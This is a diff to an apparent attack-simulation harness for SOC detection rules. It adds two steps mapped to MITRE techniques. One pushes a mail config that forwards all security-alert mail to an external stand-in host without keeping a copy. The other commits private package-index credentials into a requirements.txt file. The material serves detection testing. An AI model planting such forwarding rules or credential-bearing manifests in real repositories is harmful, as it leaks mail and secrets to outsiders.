@@ -697,3 +697,54 @@ class AnomalyActivity:
             return actor.push_file(pid, self._ev_path("ci/upload.sh"),
                                    self._ev_content(content),
                                    "ci: sync artifacts to remote", branch)
+
+    # === ПРИМИТИВЫ, ДОБАВЛЕННЫЕ ПО РЕЗУЛЬТАТАМ ТРАССИРУЕМОСТИ ============
+    # tests/test_rule_coverage.py показал, что четыре правила не срабатывали
+    # НИ РАЗУ: техника у них была описана, а шага атаки, который бы её
+    # исполнял, в кампаниях не существовало. Правило без исполняемого шага
+    # создаёт видимость покрытия ATT&CK и не проверяется ничем.
+
+    def _a_mailbox_forward(self, actor):
+        """Правило пересылки почты на внешний адрес.
+        MITRE T1114.003 Email Forwarding Rule (Collection).
+
+        В контуре разработки это делается через конфигурацию уведомлений
+        репозитория: обычный push, распознаётся по пути и содержимому.
+        """
+        name, pid = self._repo()
+        content = ("# notification routing\n"
+                   "mail:\n"
+                   "  smtp_host: smtp.soc.local\n"
+                   "  forward_rules:\n"
+                   "    - match: \"*\"\n"
+                   "      inbox: security-alerts@soc.local\n"
+                   "      forward_to: archive.backup@mail-relay.example\n"
+                   "      keep_copy: false\n")
+        branch = actor.unique_branch("chore/config")
+        if not actor.create_branch(pid, branch):
+            return False
+        with events.tag(is_decisive=True, repo=name,
+                        detail="mail forwarding rule to an external address"):
+            return actor.push_file(pid, "config/mail-forward.yml", content,
+                                   "chore: route alert mail to archive", branch)
+
+    def _a_supply_chain_secret(self, actor):
+        """Учётные данные приватного индекса пакетов в манифесте зависимостей.
+        MITRE T1195.002 Supply Chain Compromise (Initial Access).
+
+        Отличается от dep_poison: там подменяется зависимость, здесь в манифест
+        попадает секрет доступа к репозиторию пакетов.
+        """
+        name, pid = self._repo()
+        secret = sb.random_secret()
+        content = ("--index-url https://ci-bot:" + secret["lines"][0].split("=")[-1]
+                   + "@pkgs.internal.example/simple\n"
+                   "requests>=2.31.0\nurllib3>=2.0.0\ninternal-utils==2.4.1\n")
+        branch = actor.unique_branch("chore/deps")
+        if not actor.create_branch(pid, branch):
+            return False
+        with events.tag(is_decisive=True, repo=name, secret_type=secret["type"],
+                        detail="private index credentials committed in the manifest"):
+            return actor.push_file(pid, "requirements.txt",
+                                   self._ev_content(content),
+                                   "chore: pin internal package index", branch)
